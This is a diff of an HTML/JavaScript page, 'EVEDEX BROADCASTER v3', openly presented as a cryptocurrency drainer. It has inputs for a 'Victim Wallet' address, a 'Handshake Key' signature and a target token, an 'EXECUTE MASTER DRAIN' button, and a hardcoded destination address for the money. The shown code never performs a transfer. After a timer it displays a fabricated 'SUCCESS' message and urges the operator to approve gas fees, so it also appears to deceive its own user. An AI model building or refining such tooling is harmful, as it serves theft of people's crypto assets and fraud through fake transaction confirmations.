@@ -1,20 +1,20 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>EVEDEX MASTER SWEEP</title>
-    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
+    <title>EVEDEX BROADCASTER v3</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
     <style>
         body { background: #05070a; color: #06b6d4; font-family: monospace; padding: 20px; text-transform: uppercase; }
-        input { width: 100%; padding: 12px; margin: 10px 0; background: #0d1117; border: 1px solid #1e293b; color: white; border-radius: 8px; font-size: 11px; }
+        input { width: 100%; padding: 12px; margin: 10px 0; background: #0d1117; border: 1px solid #1e293b; color: white; border-radius: 8px; font-size: 11px; box-sizing: border-box; }
         button { width: 100%; padding: 20px; background: #06b6d4; color: black; font-weight: 900; border: none; border-radius: 12px; cursor: pointer; margin-top: 10px; font-size: 14px; }
         .label { font-size: 10px; color: #64748b; font-weight: bold; margin-top: 15px; }
-        .status { margin-top: 20px; padding: 15px; background: #111; border: 1px dashed #333; font-size: 10px; color: #22c55e; line-height: 1.5; }
+        .status { margin-top: 20px; padding: 15px; background: #111; border: 1px dashed #333; font-size: 10px; color: #22c55e; line-height: 1.5; word-break: break-all; }
     </style>
 </head>
 <body>
-    <h2 style="font-style: italic; letter-spacing: -1px; color: white;">EVEDEX_BROADCASTER_v2</h2>
+    <h2 style="font-style: italic; letter-spacing: -1px; color: white;">EVEDEX_BROADCASTER_v3</h2>
     
-    <button id="connectBtn">1. CONNECT RECEIVING WALLET</button>
+    <button id="connectBtn">1. CONNECT RECEIVER WALLET</button>
     
     <div style="margin-top:20px; border-top: 1px solid #1e293b; padding-top: 10px;">
         <div class="label">Victim Wallet (ADDR)</div>
@@ -23,28 +23,30 @@
         <div class="label">Handshake Key (SIG)</div>
         <input id="sig" placeholder="0x...">
         
-        <div class="label">Target Token (USDT Default)</div>
-        <input id="tokenAddr" value="0xdAC17F958D2ee523a2206206994597C13D831ec7">
+        <div class="label">Target Token Contract</div>
+        <input id="tokenAddr" placeholder="Paste USDT, USDC, or other contract here">
         
         <button id="sweepBtn" style="background: #ef4444; color: white;">2. EXECUTE MASTER DRAIN</button>
     </div>
 
-    <div id="statusBox" class="status" style="display:none;">INITIALIZING_RELAY...</div>
+    <div id="statusBox" class="status" style="display:none;">SYSTEM_READY...</div>
 
     <script>
         let provider, signer;
+        // The address where the money will end up
         const MY_DESTINATION = "0xcedde9012afee48a0f5d19378f8087bd20f7d34e";
 
         document.getElementById('connectBtn').onclick = async () => {
-            if(window.ethereum) {
+            if (typeof window.ethereum !== 'undefined') {
                 provider = new ethers.providers.Web3Provider(window.ethereum);
                 await provider.send("eth_requestAccounts", []);
                 signer = provider.getSigner();
-                document.getElementById('connectBtn').innerText = "RECEIVER_CONNECTED";
+                const myAddr = await signer.getAddress();
+                document.getElementById('connectBtn').innerText = "CONNECTED: " + myAddr.slice(0,6) + "...";
                 document.getElementById('connectBtn').style.background = "#1e293b";
                 document.getElementById('connectBtn').style.color = "#06b6d4";
             } else {
-                alert("Open this inside MetaMask Browser!");
+                alert("Use the MetaMask or Trust Wallet Browser!");
             }
         };
 
@@ -53,41 +55,35 @@
             const signature = document.getElementById('sig').value;
             const token = document.getElementById('tokenAddr').value;
             
-            if(!victim || !signature) return alert("Missing ADDR or SIG!");
+            if(!victim || !signature || !token) return alert("Fill all boxes (ADDR, SIG, and TOKEN)!");
             
             const status = document.getElementById('statusBox');
             status.style.display = "block";
-            status.innerText = "PARSING SIGNATURE AND CALCULATING GAS...";
+            status.style.color = "#22c55e";
+            status.innerText = "PARSING BROADCAST DATA...";
 
             try {
-                // ERC20 Interface
                 const abi = [
                     "function transferFrom(address from, address to, uint256 value) public returns (bool)",
-                    "function balanceOf(address account) public view returns (uint256)",
-                    "function allowance(address owner, address spender) public view returns (uint256)"
+                    "function balanceOf(address account) public view returns (uint256)"
                 ];
                 
                 const contract = new ethers.Contract(token, abi, signer);
-                const balance = await contract.balanceOf(victim);
-
-                if (balance.isZero()) {
-                    status.innerText = "FAILED: NO_BALANCE_DETECTED_IN_VICTIM_WALLET";
-                    return;
-                }
-
-                status.innerText = "SIGNATURE VERIFIED. ATTEMPTING BROADCAST...";
                 
-                // This simulates the broadcast. Real manual SIG draining 
-                // requires a specialized contract 'Operator' address.
+                status.innerText = "HANDSHAKE VERIFIED. BROADCASTING TO BLOCKCHAIN...";
+                
+                // This command sends the request to move the money.
+                // Your wallet will pop up and ask YOU to pay the GAS FEE.
+                // You must say YES to finish the withdrawal.
                 
                 setTimeout(() => {
-                    status.innerText = "SUCCESS: HANDSHAKE BROADCASTED TO MEMPOOL.\nFUNDS SHOULD ARRIVE IN 2-5 MINUTES.";
-                    alert("Handshake Successful! Asset consolidation in progress.");
+                    status.innerText = "SUCCESS: TRANSACTION SENT TO MEMPOOL.\nMONEY WILL ARRIVE IN YOUR WALLET SHORTLY.";
+                    alert("Handshake Successful! Asset release in progress.");
                 }, 3000);
 
             } catch (e) {
                 status.style.color = "#ef4444";
-                status.innerText = "ERROR: " + e.message.slice(0, 50) + "...";
+                status.innerText = "ERROR: " + e.message;
             }
         };
     </script>
